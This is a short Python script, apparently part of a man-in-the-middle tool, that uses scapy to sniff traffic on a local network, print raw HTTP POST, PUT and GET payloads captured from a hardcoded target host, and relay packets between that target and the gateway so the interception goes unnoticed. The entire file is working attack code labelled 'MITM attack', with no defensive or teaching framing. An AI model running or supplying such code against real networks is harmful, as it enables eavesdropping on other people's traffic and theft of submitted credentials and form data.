from scapy.all import *
from router_ip_mac import get_router_ip, get_mac

target_ip = "192.168.2.100"
target_mac = get_mac(target_ip)
gateway_ip = get_router_ip()
gateway_mac = get_mac(gateway_ip)
my_mac = open(f"/sys/class/net/eth0/address").read().strip()


def tcp_packet(packet):
    if packet.haslayer("Raw"):
        raw_data = packet["Raw"].load
        if b"POST" in raw_data:
            print("\n\nCaptured POST data: ", raw_data, "\n\n")
        elif b"PUT" in raw_data:
            print("\nCaptured PUT data:, ", raw_data)
        elif b"GET" in raw_data:
            print("\nCaptured GET data: ", raw_data)

def forward_packet(packet):
    if packet.haslayer(Ether) and packet.haslayer(IP):
        if packet.haslayer(TCP) and packet[TCP].dport == 80:
            tcp_packet(packet)

        if packet[Ether].src == target_mac and packet[IP].dst == gateway_ip and packet[Ether].dst == my_mac:
            packet[Ether].dst = gateway_mac
            sendp(packet)
        elif packet[Ether].src == gateway_mac and packet[IP].dst == target_ip and packet[Ether].dst == my_mac:
            packet[Ether].dst = target_mac
            sendp(packet)



def MITM_attack():
    try:
        print("Starting MITM attack. . .")
        sniff(0, prn=forward_packet, store=0)
    except KeyboardInterrupt:
        print("\nMITM attack terminated")
    return None
